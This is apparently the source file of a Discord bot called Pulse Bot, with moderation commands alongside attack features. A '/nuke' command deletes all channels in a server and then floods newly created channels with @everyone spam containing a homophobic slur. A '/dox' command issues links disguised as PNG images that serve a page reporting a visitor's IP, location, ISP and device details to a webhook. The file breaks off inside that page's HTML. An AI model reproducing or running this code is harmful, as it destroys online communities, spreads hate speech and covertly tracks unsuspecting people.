require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const app = express();
const crypto = require('crypto');

const TOKEN = process.env.TOKEN;
const PORT = process.env.PORT || 9626;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';

if (!TOKEN) {
    console.error('❌ TOKEN environment variable is required!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent
    ]
});

const links = new Map();
let nukeRunning = false;
let nukeGuildId = null;
let startTime = Date.now();

// ---- ANTI-NUKE SETTINGS ----
const antiNukeSettings = new Map();

app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook));
});

async function registerCommands() {
    try {
        await client.application.commands.set([
            { name: 'nuke', description: '💀 Starts the nuke' },
            { name: 'stop', description: '⏹️ Stops the nuke' },
            { 
                name: 'dox', 
                description: '📸 Generate dox link',
                options: [
                    {
                        name: 'webhook',
                        type: 3,
                        description: 'Webhook URL',
                        required: true
                    }
                ]
            },
            { name: 'ping', description: '🏓 Check bot latency' },
            { name: 'serverinfo', description: '📊 Get server information' },
            { 
                name: 'userinfo', 
                description: '👤 Get user information',
                options: [{ name: 'user', type: 6, description: 'Target user', required: false }]
            },
            { 
                name: 'avatar', 
                description: '🖼️ Get user avatar',
                options: [{ name: 'user', type: 6, description: 'Target user', required: false }]
            },
            { 
                name: 'say', 
                description: '💬 Make the bot say something',
                options: [{ name: 'message', type: 3, description: 'Message to say', required: true }]
            },
            { 
                name: 'kick', 
                description: '👢 Kick a member',
                options: [
                    { name: 'user', type: 6, description: 'User to kick', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { 
                name: 'ban', 
                description: '🔨 Ban a member',
                options: [
                    { name: 'user', type: 6, description: 'User to ban', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { 
                name: 'clear', 
                description: '🧹 Clear messages in a channel',
                options: [{ name: 'amount', type: 4, description: 'Number of messages (1-100)', required: true }]
            },
            { 
                name: 'timeout', 
                description: '⏰ Timeout a member',
                options: [
                    { name: 'user', type: 6, description: 'User to timeout', required: true },
                    { name: 'minutes', type: 4, description: 'Minutes (1-60)', required: true },
                    { name: 'reason', type: 3, description: 'Reason', required: false }
                ]
            },
            { name: 'uptime', description: '⏱️ Bot uptime' },
            { name: 'invite', description: '🔗 Get bot invite link' },
            { name: 'stats', description: '📊 Bot statistics' },
            { 
                name: 'poll', 
                description: '📊 Create a poll',
                options: [
                    { name: 'question', type: 3, description: 'Poll question', required: true },
                    { name: 'option1', type: 3, description: 'First option', required: true },
                    { name: 'option2', type: 3, description: 'Second option', required: true }
                ]
            },
            { 
                name: 'slowmode', 
                description: '🐢 Set slowmode in a channel',
                options: [{ name: 'seconds', type: 4, description: 'Slowmode seconds (0-21600)', required: true }]
            },
            { 
                name: 'lock', 
                description: '🔒 Lock a channel',
                options: [{ name: 'channel', type: 7, description: 'Channel to lock', required: false }]
            },
            { 
                name: 'unlock', 
                description: '🔓 Unlock a channel',
                options: [{ name: 'channel', type: 7, description: 'Channel to unlock', required: false }]
            },
            { name: 'rolelist', description: '📋 List all server roles' },
            // ---- ANTI-NUKE COMMANDS ----
            { 
                name: 'antinuke', 
                description: '🛡️ Anti-nuke protection settings',
                options: [
                    {
                        name: 'action',
                        type: 3,
                        description: 'Action to take',
                        required: true,
                        choices: [
                            { name: 'Enable', value: 'enable' },
                            { name: 'Disable', value: 'disable' },
                            { name: 'Status', value: 'status' }
                        ]
                    }
                ]
            },
            { 
                name: 'whitelist', 
                description: '➕ Whitelist a user from anti-nuke protection',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'User to whitelist',
                        required: true
                    }
                ]
            },
            { 
                name: 'unwhitelist', 
                description: '➖ Remove a user from the whitelist',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'User to remove',
                        required: true
                    }
                ]
            },
            { 
                name: 'whitelisted', 
                description: '📋 Show whitelisted users'
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('Failed to register commands:', error);
    }
}

// ---- ANTI-NUKE FUNCTIONS ----
function getAntiNuke(guildId) {
    if (!antiNukeSettings.has(guildId)) {
        antiNukeSettings.set(guildId, {
            enabled: true,
            whitelist: []
        });
    }
    return antiNukeSettings.get(guildId);
}

function isWhitelisted(guildId, userId) {
    const settings = getAntiNuke(guildId);
    return settings.whitelist.includes(userId) || settings.whitelist.includes('*');
}

// ---- ANTI-NUKE EVENT HANDLERS ----
client.on('guildMemberAdd', async (member) => {
    const settings = getAntiNuke(member.guild.id);
    if (!settings.enabled) return;
    
    // Check if user is suspicious (new account, no profile pic, etc.)
    const now = Date.now();
    const accountAge = now - member.user.createdTimestamp;
    const daysOld = accountAge / (1000 * 60 * 60 * 24);
    
    if (daysOld < 7 && !isWhitelisted(member.guild.id, member.id)) {
        try {
            await member.send('⚠️ Your account is too new to join this server. Please contact staff.');
            await member.kick('Auto-anti-raid: Account too new');
            console.log(`🔨 Kicked suspicious account: ${member.user.tag} (${daysOld} days old)`);
        } catch (e) {}
    }
});

client.on('guildMemberUpdate', async (oldMember, newMember) => {
    const settings = getAntiNuke(newMember.guild.id);
    if (!settings.enabled) return;
    if (isWhitelisted(newMember.guild.id, newMember.id)) return;
    
    // Check for role changes (potential role bombing)
    const oldRoles = oldMember.roles.cache.map(r => r.id);
    const newRoles = newMember.roles.cache.map(r => r.id);
    const addedRoles = newRoles.filter(r => !oldRoles.includes(r));
    
    if (addedRoles.length > 5) {
        try {
            await newMember.roles.set(oldRoles, 'Anti-raid: Suspicious role changes');
            const adminRole = newMember.guild.roles.cache.find(r => r.permissions.has(PermissionsBitField.Flags.Administrator));
            if (adminRole) {
                const owner = await newMember.guild.fetchOwner();
                await owner.send(`⚠️ **Suspicious activity detected!**\n${newMember.user.tag} tried to add ${addedRoles.length} roles.\nServer: ${newMember.guild.name}`);
            }
            console.log(`🛡️ Blocked role bomb from: ${newMember.user.tag}`);
        } catch (e) {}
    }
});

client.on('channelCreate', async (channel) => {
    const settings = getAntiNuke(channel.guild.id);
    if (!settings.enabled) return;
    
    // Check for mass channel creation (potential raid)
    const channelCache = channel.guild.channels.cache;
    const recentChannels = channelCache.filter(c => 
        Date.now() - c.createdTimestamp < 60000
    );
    
    if (recentChannels.size > 5) {
        const owner = await channel.guild.fetchOwner();
        await owner.send(`⚠️ **Mass channel creation detected!**\n${recentChannels.size} channels created in the last minute.\nServer: ${channel.guild.name}`);
        console.log(`🛡️ Mass channel creation detected in: ${channel.guild.name}`);
    }
});

// ---- INTERACTION HANDLER ----
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, user, member, guild, channel } = interaction;

    try {
        // ---- ANTI-NUKE COMMANDS ----
        if (commandName === 'antinuke') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            
            const botMember = guild.members.cache.get(client.user.id);
            if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                return interaction.editReply({ content: '❌ I need **Administrator** permissions.', flags: 64 });
            }
            
            const action = options.getString('action');
            const settings = getAntiNuke(guild.id);
            
            if (action === 'enable') {
                settings.enabled = true;
                antiNukeSettings.set(guild.id, settings);
                await interaction.editReply({ content: '🛡️ **Anti-nuke protection enabled!**', flags: 64 });
            } else if (action === 'disable') {
                settings.enabled = false;
                antiNukeSettings.set(guild.id, settings);
                await interaction.editReply({ content: '🛡️ **Anti-nuke protection disabled.**', flags: 64 });
            } else if (action === 'status') {
                const embed = new EmbedBuilder()
                    .setTitle('🛡️ Anti-Nuke Status')
                    .setColor(settings.enabled ? 0x00FF00 : 0xFF0000)
                    .addFields(
                        { name: 'Status', value: settings.enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                        { name: 'Whitelisted Users', value: settings.whitelist.length > 0 ? settings.whitelist.join('\n') : 'None', inline: false }
                    );
                await interaction.editReply({ embeds: [embed], flags: 64 });
            }
        }

        if (commandName === 'whitelist') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            
            const target = options.getUser('user');
            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
            
            const settings = getAntiNuke(guild.id);
            if (settings.whitelist.includes(target.id)) {
                return interaction.editReply({ content: `✅ ${target.tag} is already whitelisted.`, flags: 64 });
            }
            
            settings.whitelist.push(target.id);
            antiNukeSettings.set(guild.id, settings);
            await interaction.editReply({ content: `✅ **${target.tag}** has been whitelisted.`, flags: 64 });
        }

        if (commandName === 'unwhitelist') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            
            const target = options.getUser('user');
            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
            
            const settings = getAntiNuke(guild.id);
            const index = settings.whitelist.indexOf(target.id);
            if (index === -1) {
                return interaction.editReply({ content: `❌ ${target.tag} is not whitelisted.`, flags: 64 });
            }
            
            settings.whitelist.splice(index, 1);
            antiNukeSettings.set(guild.id, settings);
            await interaction.editReply({ content: `✅ **${target.tag}** has been removed from the whitelist.`, flags: 64 });
        }

        if (commandName === 'whitelisted') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            
            const settings = getAntiNuke(guild.id);
            const embed = new EmbedBuilder()
                .setTitle('📋 Whitelisted Users')
                .setColor(0x8B5CF6)
                .setDescription(settings.whitelist.length > 0 ? settings.whitelist.join('\n') : 'No users whitelisted.');
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

        // ---- DOX ----
        if (commandName === 'dox') {
            await interaction.deferReply({ flags: 64 });
            
            const wh = interaction.options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply({ content: '❌ Invalid webhook URL.', flags: 64 });
            }
            
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://image-klipy-gif.wisp.uno/img/${id}.png`;
            links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });
            
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, battery, and device info.`)
                .setFooter({ text: `Generated by ${interaction.user.tag}` });
            
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

        // ---- NUKE ----
        if (commandName === 'nuke') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            
            // Anti-nuke check
            const settings = getAntiNuke(guild.id);
            if (settings.enabled && !isWhitelisted(guild.id, user.id)) {
                return interaction.editReply({ content: '❌ Anti-nuke protection is enabled. You are not whitelisted.', flags: 64 });
            }
            
            const botMember = guild.members.cache.get(client.user.id);
            if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                return interaction.editReply({ content: '❌ I need **Administrator** permissions.', flags: 64 });
            }
            if (nukeRunning) return interaction.editReply({ content: '❌ Nuke already running. Use `/stop`.', flags: 64 });
            nukeRunning = true;
            nukeGuildId = guild.id;
            await interaction.editReply({ content: '🚀 **NUKE STARTED!** Use `/stop` to stop.', flags: 64 });
            await startNuke(guild);
        }

        // ---- STOP ----
        if (commandName === 'stop') {
            await interaction.deferReply({ flags: 64 });
            if (!nukeRunning) return interaction.editReply({ content: '❌ No nuke running.', flags: 64 });
            nukeRunning = false;
            nukeGuildId = null;
            await interaction.editReply({ content: '⏹️ **Nuke stopped.**', flags: 64 });
        }

        // ---- PING ----
        if (commandName === 'ping') {
            const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply({ content: `🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`, flags: 64 });
        }

        // ---- SERVERINFO ----
        if (commandName === 'serverinfo') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

        // ---- USERINFO ----
        if (commandName === 'userinfo') {
            await interaction.deferReply({ flags: 64 });
            const target = interaction.options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

        // ---- AVATAR ----
        if (commandName === 'avatar') {
            await interaction.deferReply({ flags: 64 });
            const target = interaction.options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

        // ---- SAY ----
        if (commandName === 'say') {
            await interaction.deferReply({ flags: 64 });
            const msg = interaction.options.getString('message');
            if (!channel) return interaction.editReply({ content: '❌ No channel.', flags: 64 });
            await channel.send(msg);
            await interaction.editReply({ content: '✅ Sent.', flags: 64 });
        }

        // ---- KICK ----
        if (commandName === 'kick') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            const target = interaction.options.getMember('user');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                return interaction.editReply({ content: '❌ You need **Kick Members** permission.', flags: 64 });
            }
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                return interaction.editReply({ content: '❌ I need **Kick Members** permission.', flags: 64 });
            }
            if (target.id === guild.ownerId) return interaction.editReply({ content: '❌ Cannot kick the server owner.', flags: 64 });
            if (target.id === client.user.id) return interaction.editReply({ content: '❌ Cannot kick myself.', flags: 64 });
            await target.kick(reason);
            await interaction.editReply({ content: `✅ **${target.user.tag}** kicked. Reason: ${reason}`, flags: 64 });
        }

        // ---- BAN ----
        if (commandName === 'ban') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            const target = interaction.options.getUser('user');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                return interaction.editReply({ content: '❌ You need **Ban Members** permission.', flags: 64 });
            }
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                return interaction.editReply({ content: '❌ I need **Ban Members** permission.', flags: 64 });
            }
            if (target.id === guild.ownerId) return interaction.editReply({ content: '❌ Cannot ban the server owner.', flags: 64 });
            if (target.id === client.user.id) return interaction.editReply({ content: '❌ Cannot ban myself.', flags: 64 });
            await guild.bans.create(target.id, { reason });
            await interaction.editReply({ content: `✅ **${target.tag}** banned. Reason: ${reason}`, flags: 64 });
        }

        // ---- CLEAR ----
        if (commandName === 'clear') {
            await interaction.deferReply({ flags: 64 });
            const amount = interaction.options.getInteger('amount');
            if (amount < 1 || amount > 100) return interaction.editReply({ content: '❌ Amount must be between 1 and 100.', flags: 64 });
            if (!channel) return interaction.editReply({ content: '❌ No channel.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
                return interaction.editReply({ content: '❌ You need **Manage Messages** permission.', flags: 64 });
            }
            const messages = await channel.messages.fetch({ limit: amount });
            await channel.bulkDelete(messages, true);
            await interaction.editReply({ content: `✅ Deleted ${messages.size} messages.`, flags: 64 });
        }

        // ---- TIMEOUT ----
        if (commandName === 'timeout') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            const target = interaction.options.getMember('user');
            const minutes = interaction.options.getInteger('minutes');
            const reason = interaction.options.getString('reason') || 'No reason provided';
            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
            if (minutes < 1 || minutes > 60) return interaction.editReply({ content: '❌ Minutes must be between 1 and 60.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
                return interaction.editReply({ content: '❌ You need **Moderate Members** permission.', flags: 64 });
            }
            await target.timeout(minutes * 60 * 1000, reason);
            await interaction.editReply({ content: `✅ **${target.user.tag}** timed out for ${minutes} minutes. Reason: ${reason}`, flags: 64 });
        }

        // ---- UPTIME ----
        if (commandName === 'uptime') {
            const uptime = Date.now() - startTime;
            const days = Math.floor(uptime / 86400000);
            const hours = Math.floor((uptime % 86400000) / 3600000);
            const minutes = Math.floor((uptime % 3600000) / 60000);
            const seconds = Math.floor((uptime % 60000) / 1000);
            await interaction.reply({ content: `⏱️ **Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s`, flags: 64 });
        }

        // ---- INVITE ----
        if (commandName === 'invite') {
            const inviteURL = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot+applications.commands`;
            await interaction.reply({ content: `🔗 **Invite Pulse Bot:**\n${inviteURL}`, flags: 64 });
        }

        // ---- STATS ----
        if (commandName === 'stats') {
            const totalServers = client.guilds.cache.size;
            const totalUsers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
            const memoryUsed = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
            const embed = new EmbedBuilder()
                .setTitle('📊 Bot Statistics')
                .setColor(0x8B5CF6)
                .addFields(
                    { name: '📡 Servers', value: `${totalServers}`, inline: true },
                    { name: '👥 Users', value: `${totalUsers}`, inline: true },
                    { name: '💾 Memory', value: `${memoryUsed} MB`, inline: true },
                    { name: '🏓 Ping', value: `${Math.round(client.ws.ping)}ms`, inline: true },
                    { name: '⏱️ Uptime', value: `<t:${Math.floor(Date.now() / 1000 - (Date.now() - startTime) / 1000)}:R>`, inline: true }
                );
            await interaction.reply({ embeds: [embed], flags: 64 });
        }

        // ---- POLL ----
        if (commandName === 'poll') {
            await interaction.deferReply({ flags: 64 });
            if (!channel) return interaction.editReply({ content: '❌ No channel.', flags: 64 });
            const question = interaction.options.getString('question');
            const option1 = interaction.options.getString('option1');
            const option2 = interaction.options.getString('option2');
            const embed = new EmbedBuilder()
                .setTitle('📊 Poll')
                .setDescription(question)
                .setColor(0x8B5CF6)
                .addFields(
                    { name: '1️⃣', value: option1, inline: true },
                    { name: '2️⃣', value: option2, inline: true }
                )
                .setFooter({ text: `Poll created by ${user.tag}` });
            const pollMsg = await channel.send({ embeds: [embed] });
            await pollMsg.react('1️⃣');
            await pollMsg.react('2️⃣');
            await interaction.editReply({ content: '✅ Poll created!', flags: 64 });
        }

        // ---- SLOWMODE ----
        if (commandName === 'slowmode') {
            await interaction.deferReply({ flags: 64 });
            const seconds = interaction.options.getInteger('seconds');
            if (seconds < 0 || seconds > 21600) return interaction.editReply({ content: '❌ Slowmode must be between 0 and 21600 seconds.', flags: 64 });
            if (!channel) return interaction.editReply({ content: '❌ No channel.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply({ content: '❌ You need **Manage Channels** permission.', flags: 64 });
            }
            await channel.setRateLimitPerUser(seconds);
            await interaction.editReply({ content: `✅ Slowmode set to ${seconds} seconds.`, flags: 64 });
        }

        // ---- LOCK ----
        if (commandName === 'lock') {
            await interaction.deferReply({ flags: 64 });
            const targetChannel = interaction.options.getChannel('channel') || channel;
            if (!targetChannel) return interaction.editReply({ content: '❌ Channel not found.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply({ content: '❌ You need **Manage Channels** permission.', flags: 64 });
            }
            await targetChannel.permissionOverwrites.edit(guild.id, { SendMessages: false });
            await interaction.editReply({ content: `🔒 **${targetChannel.name}** locked.`, flags: 64 });
        }

        // ---- UNLOCK ----
        if (commandName === 'unlock') {
            await interaction.deferReply({ flags: 64 });
            const targetChannel = interaction.options.getChannel('channel') || channel;
            if (!targetChannel) return interaction.editReply({ content: '❌ Channel not found.', flags: 64 });
            if (!member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
                return interaction.editReply({ content: '❌ You need **Manage Channels** permission.', flags: 64 });
            }
            await targetChannel.permissionOverwrites.edit(guild.id, { SendMessages: null });
            await interaction.editReply({ content: `🔓 **${targetChannel.name}** unlocked.`, flags: 64 });
        }

        // ---- ROLELIST ----
        if (commandName === 'rolelist') {
            await interaction.deferReply({ flags: 64 });
            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
            const roles = guild.roles.cache
                .filter(r => r.id !== guild.id)
                .sort((a, b) => b.position - a.position)
                .map(r => r.toString())
                .join(', ');
            const embed = new EmbedBuilder()
                .setTitle('📋 Server Roles')
                .setDescription(roles || 'No custom roles found.')
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed], flags: 64 });
        }

    } catch (error) {
        console.error('Error:', error);
        try {
            await interaction.editReply({ content: `❌ Error: ${error.message}`, flags: 64 });
        } catch (e) {}
    }
});

// ---- START NUKE ----
async function startNuke(guild) {
    const variants = [
        '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER'
    ];
    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

    const channels = guild.channels.cache;
    console.log(`Deleting ${channels.size} channels...`);
    
    const channelArray = Array.from(channels.values());
    for (let i = 0; i < channelArray.length; i += 10) {
        const batch = channelArray.slice(i, i + 10);
        await Promise.all(batch.map(async (ch) => {
            try { await ch.delete(); } catch(e) {}
        }));
        await new Promise(r => setTimeout(r, 50));
    }
    console.log('All channels deleted.');

    async function spamChannel(ch) {
        if (!nukeRunning) return;
        try {
            while (nukeRunning) {
                try {
                    const line = variants[Math.floor(Math.random() * variants.length)];
                    let big = `@everyone ${line}\n`;
                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                        big += line + '\n';
                    }
                    big += `\n${inviteLine}`;
                    await ch.send(big.slice(0, 2000));
                } catch(e) {}
                await new Promise(r => setTimeout(r, 10));
            }
        } catch(e) {}
    }

    async function createChannelsAndSpam() {
        let createdCount = 0;
        while (nukeRunning) {
            try {
                const newChannels = await Promise.all([
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                ]);
                
                const valid = newChannels.filter(c => c !== null);
                for (const ch of valid) spamChannel(ch);
                createdCount += valid.length;
                console.log(`Created ${createdCount} channels`);
            } catch(e) {}
            await new Promise(r => setTimeout(r, 10));
        }
    }

    createChannelsAndSpam();
    guild.channels.cache.forEach(ch => {
        if (ch.type === ChannelType.GuildText) spamChannel(ch);
    });
}

function generateDoxHTML(webhook) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; }
       
